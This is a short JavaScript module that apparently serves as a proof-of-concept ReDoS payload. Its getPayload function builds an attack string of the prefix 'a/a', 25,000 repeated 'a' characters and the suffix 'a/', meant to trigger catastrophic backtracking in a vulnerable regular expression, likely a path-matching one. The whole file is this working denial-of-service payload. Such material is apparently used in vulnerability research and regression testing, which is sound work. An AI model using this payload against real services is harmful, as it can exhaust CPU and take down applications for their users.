function getPayload() {
  let prefix = "a/a";
  let pump = "a";
  let suffix = "a/";
  let attackString = prefix;
  for (let i = 0; i < 25000; i++) {
    attackString += pump;
  }
  attackString += suffix;
  return attackString;
}

module.exports = { getPayload };